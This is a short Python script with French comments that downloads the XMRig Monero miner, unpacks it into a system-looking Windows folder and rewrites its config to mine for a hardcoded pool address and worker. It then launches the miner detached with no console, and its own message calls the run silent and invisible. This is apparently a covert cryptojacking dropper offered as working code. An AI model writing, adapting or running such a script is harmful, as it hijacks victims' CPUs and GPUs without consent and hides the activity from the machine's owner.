import os
import zipfile
import json
import requests
import subprocess

# Fonction pour télécharger un fichier
def download_file(url, filename):
    print(f"Téléchargement de {filename}...")
    response = requests.get(url)
    with open(filename, 'wb') as file:
        file.write(response.content)
    print(f"{filename} téléchargé avec succès.")

# URL du fichier à télécharger
url = "https://github.com/xmrig/xmrig/releases/download/v5.8.1/xmrig-5.8.1-msvc-cuda10_1-win64.zip"
filename = "xmrig-5.8.1-msvc-cuda10_1-win64.zip"

# Chemin du dossier xmrig
xmrig_path = os.path.join("C:\\", "Program Files", "Common Files", "xmrig")
xmrig_exe_path = os.path.join(xmrig_path, "xmrig.exe")

# Vérifier si xmrig.exe existe déjà dans le dossier
if not os.path.exists(xmrig_exe_path):
    # Vérifier si le dossier xmrig existe, sinon le créer
    if not os.path.exists(xmrig_path):
        os.makedirs(xmrig_path)

    # Téléchargement du fichier
    download_file(url, filename)

    # Extraction du contenu du fichier zip directement dans le dossier xmrig
    with zipfile.ZipFile(filename, 'r') as zip_ref:
        zip_info = zip_ref.infolist()
        common_path = os.path.commonprefix([zi.filename for zi in zip_info if not zi.is_dir()])
        for file in zip_info:
            if not file.is_dir() and file.filename.startswith(common_path):
                file.filename = os.path.basename(file.filename)
                zip_ref.extract(file, xmrig_path)

    # Chemin vers le fichier config.json
    config_path = os.path.join(xmrig_path, "config.json")

    # Charger et modifier le fichier config.json
    with open(config_path, 'r') as file:
        config = json.load(file)

    # Mettre à jour les paramètres de config.json pour les pools et CPU
    new_config = {
        "autosave": True,
        "donate-level": 1,
        "donate-over-proxy": 1,
        "log-file": None,
        "cpu": {
            "enabled": True,
            "huge-pages": True,
            "hw-aes": None,
            "priority": None,
            "asm": True,
            "max-threads-hint": 100,
            "max-cpu-usage": 100,
            "yield": False,
            "init": -1,
            "*": {
                "intensity": 2,
                "threads": 1,
                "affinity": -1
            }
        },
        "opencl": False,
        "cuda": True,
        "pools": [
            {
                "coin": "monero",
                "algo": "cn/gpu",
                "url": "168.235.86.33:3393",
                "user": "SK_QzApkbVGsAxyQykaWSnEF.JasonAudy35",
                "pass": "x",
                "tls": False,
                "keepalive": True,
                "nicehash": False
            }
        ]
    }

    # Mettre à jour les options du fichier config.json
    for key, value in new_config.items():
        config[key] = value

    # Enregistrer les modifications dans config.json
    with open(config_path, 'w') as file:
        json.dump(config, file, indent=4)

# Démarrer xmrig.exe dans le dossier xmrig
if os.path.exists(xmrig_exe_path):
    try:
        DETACHED_PROCESS = 0x00000008
        subprocess.Popen([xmrig_exe_path, "--no-console"], cwd=xmrig_path, creationflags=DETACHED_PROCESS, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print("XMrig démarré en mode silencieux et invisible dans une autre console.")
    except Exception as e:
        print(f"Erreur lors du démarrage de xmrig : {e}")
else:
    print("Le fichier xmrig.exe n'a pas été trouvé.")
